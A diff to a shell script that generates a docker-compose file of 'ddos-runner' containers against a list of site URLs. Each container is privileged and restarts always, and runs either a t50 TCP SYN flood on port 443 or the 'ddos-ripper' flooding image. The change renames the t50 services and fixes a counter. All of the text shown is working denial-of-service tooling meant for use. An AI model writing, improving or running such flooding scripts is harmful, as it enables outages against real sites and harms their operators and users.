@@ -56,12 +56,12 @@ function generate_compose {
             if [ ! -z $site_url ]; then
                 # t50 is only used if we don't have slashes in the path: just domain names
                 if [ 0 -le $MAX_T50 ] && [[ "$site_url" != *\/* ]] && [[ "$site_url" != *\\* ]]; then
-                  ((MAX_T50--))
-                  echo -e "  ddos-runner-$counter:" >> docker-compose.yml
+                  echo -e "  ddos-runner-t50-$MAX_T50:" >> docker-compose.yml
                   echo -e "    image: t50" >> docker-compose.yml
                   echo -e "    restart: always" >> docker-compose.yml
                   echo -e "    privileged: true" >> docker-compose.yml
                   echo -e "    command: t50 $site_url --flood -S --protocol TCP --turbo --dport 443" >> docker-compose.yml
+                  ((MAX_T50--))
                 else
                   echo -e "  ddos-runner-$counter:" >> docker-compose.yml
                   echo -e "    image: nitupkcuf/ddos-ripper:latest" >> docker-compose.yml
